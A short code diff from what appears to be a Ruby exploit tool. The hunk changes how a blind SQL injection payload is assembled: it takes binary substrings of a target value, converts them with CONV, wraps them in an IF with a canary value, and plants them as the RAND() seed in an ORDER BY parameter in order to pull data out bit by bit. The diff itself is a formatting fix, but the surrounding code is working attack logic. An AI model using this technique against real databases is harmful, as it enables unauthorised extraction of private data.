@@ -109,7 +109,7 @@ def extract_binary_string(params)
     # convert binary to base 10 for RAND(), new variable so we can re-use
     injection = 'CONV(%s,2,10)' % binary_substring
     # if substr didn't get 100%, we've hit the end, kill canary to alert us
-    injection = "IF(#{injection_length}=#{bits},%s,#{canary_value})" % injection
+    injection = "IF(%s=%s,%s,%s)" % [injection_length,bits,injection,canary_value]
     # drop injection into rand as the seed
     injection = 'RAND(%s)' % injection
     # drop injection into order param
